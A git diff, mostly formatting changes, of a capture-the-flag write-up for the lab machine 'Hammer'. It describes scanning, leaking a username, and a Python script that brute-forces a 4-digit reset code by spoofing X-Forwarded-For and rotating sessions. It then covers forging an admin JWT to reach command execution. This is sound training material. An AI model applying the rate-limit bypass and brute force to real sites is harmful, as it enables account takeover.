@@ -20,17 +20,36 @@ url: "https://asbawy.github.io/writeups/thm-hammer"
 import { Callout } from "@/components/Callout";
 import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
 
-<KillChain steps={[
-  { phase: "Reconnaissance", title: "Scanning & Fuzzing", desc: "Nmap exposes SSH and a custom web app on port 1337. Fuzzing with the hmr_ prefix leaks an open log that dumps a valid username.", tools: ["Nmap", "ffuf"] },
-  { phase: "Foothold", title: "OTP Brute Force & Account Takeover", desc: "Bypassed the password reset rate-limit with X-Forwarded-For spoofing, brute-forced the 4-digit recovery code, and reset the password to grab the user flag.", technique: "OTP Brute Force", tools: ["Python", "Caido"] },
-  { phase: "PrivEsc", title: "JWT Forgery to RCE", desc: "Forged an admin HS256 token using an exposed key, then abused execute_command.php for command execution to retrieve the root flag.", technique: "JWT Forgery", tools: ["Caido", "curl"] }
-]} />
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Scanning & Fuzzing",
+      desc: "Nmap exposes SSH and a custom web app on port 1337. Fuzzing with the hmr_ prefix leaks an open log that dumps a valid username.",
+      tools: ["Nmap", "ffuf"],
+    },
+    {
+      phase: "Foothold",
+      title: "OTP Brute Force & Account Takeover",
+      desc: "Bypassed the password reset rate-limit with X-Forwarded-For spoofing, brute-forced the 4-digit recovery code, and reset the password to grab the user flag.",
+      technique: "OTP Brute Force",
+      tools: ["Python", "Caido"],
+    },
+    {
+      phase: "PrivEsc",
+      title: "JWT Forgery to RCE",
+      desc: "Forged an admin HS256 token using an exposed key, then abused execute_command.php for command execution to retrieve the root flag.",
+      technique: "JWT Forgery",
+      tools: ["Caido", "curl"],
+    },
+  ]}
+/>
 
 ---
 
 ## Introduction
 
-*Hammer* is a medium-rated Linux machine that front-ends a small custom PHP web app on a non-standard HTTP port (**1337**). The application features a login portal with a "forgot password" flow. Our objective is to capture two flags:
+_Hammer_ is a medium-rated Linux machine that front-ends a small custom PHP web app on a non-standard HTTP port (**1337**). The application features a login portal with a "forgot password" flow. Our objective is to capture two flags:
 
 1. A **user flag** located behind the authenticated dashboard.
 2. A **root flag** readable only after escalating to an admin role and triggering remote command execution.
@@ -50,14 +69,14 @@ nmap -sC -sV -p- 10.113.158.252 -oN nmap_full.txt
 
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 0c:27:1c:24:83:8c:fe:e9:81:73:b2:8b:78:0a:0d:63 (RSA)
 |   256 12:a8:26:0d:7b:d4:6a:89:e0:3c:1f:99:bd:27:71:f7 (ECDSA)
 |_  256 03:5b:2c:9e:9e:49:e5:c9:0f:c8:51:78:23:a2:4c:4e (ED25519)
 1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
 |_      httponly flag not set
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Login
@@ -65,7 +84,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 <Callout type="info">
-Only two ports are open: SSH and a custom Apache web application on port 1337. The `PHPSESSID` cookie lacks the `HttpOnly` flag.
+  Only two ports are open: SSH and a custom Apache web application on port 1337. The `PHPSESSID`
+  cookie lacks the `HttpOnly` flag.
 </Callout>
 
 Browsing to `http://10.113.158.252:1337/` returns a login page. An HTML comment found in the page source provides a small but crucial hint:
@@ -116,7 +136,10 @@ Accessing `reset_password.php` with the leaked email returns a secondary form as
 ### Bypassing Rate Limiting and Timers
 
 <Callout type="info">
-**Two Bugs, One Exploit:** Spoofing the `X-Forwarded-For` header with a random IP defeats the IP-based rate limiter, and submitting a massive `s` value (e.g., `999999999`) neutralizes the client-side countdown. Rotating the PHP session cookie every few attempts prevents the per-session counter from blocking our requests.
+  **Two Bugs, One Exploit:** Spoofing the `X-Forwarded-For` header with a random IP defeats the
+  IP-based rate limiter, and submitting a massive `s` value (e.g., `999999999`) neutralizes the
+  client-side countdown. Rotating the PHP session cookie every few attempts prevents the per-session
+  counter from blocking our requests.
 </Callout>
 
 A short Python script can quickly iterate through the 0000–9999 space to brute-force the recovery code:
@@ -136,17 +159,17 @@ for code in range(10000):
     if code % 5 == 0:  # Rotate session to dodge the counter
         s.cookies.clear()
         s.post(f"{BASE}/reset_password.php", data={"email": EMAIL}, headers={"X-Forwarded-For": xff()})
-    
+
     r = s.post(f"{BASE}/reset_password.php",
                data={"recovery_code": f"{code:04d}", "s": "999999999"},
                headers={"X-Forwarded-For": xff()})
-               
+
     if "Invalid or expired recovery code" not in r.text:
         print(f"[+] Recovery code = {code:04d}")
         break
 ```
 
-The script successfully stops at **`1034`**. With the correct code accepted, we are redirected to the *Set New Password* form.
+The script successfully stops at **`1034`**. With the correct code accepted, we are redirected to the _Set New Password_ form.
 
 ![Set New Password form](https://i.imgur.com/mihHwlf.png)
 
@@ -176,6 +199,7 @@ Decoding the `token` cookie from the dashboard reveals the following structure:
 ![Decoded JWT in caido](https://i.imgur.com/EPJXftU.png)
 
 **Header:**
+
 ```json
 {
   "typ": "JWT",
@@ -185,19 +209,21 @@ Decoding the `token` cookie from the dashboard reveals the following structure:
 ```
 
 **Payload:**
+
 ```json
 {
   "iss": "http://hammer.thm",
   "aud": "http://hammer.thm",
-  "data": { 
-    "user_id": 1, 
-    "email": "tester@hammer.thm", 
-    "role": "user" 
+  "data": {
+    "user_id": 1,
+    "email": "tester@hammer.thm",
+    "role": "user"
   }
 }
 ```
 
 Two key observations:
+
 1. The algorithm is symmetric (**HS256**), meaning the same secret is used to both sign and verify the token.
 2. Our current role is `user`. We need to elevate this to `admin` to interact with the command execution endpoint.
 
@@ -213,7 +239,7 @@ However, testing other basic commands reveals that `ls` executes successfully:
 
 ```json
 {
-    "output": "188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\nhmr_css\nhmr_images\nhmr_js\nhmr_logs\nindex.php\nlogout.php\nreset_password.php\nvendor\n"
+  "output": "188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\nhmr_css\nhmr_images\nhmr_js\nhmr_logs\nindex.php\nlogout.php\nreset_password.php\nvendor\n"
 }
 ```
 
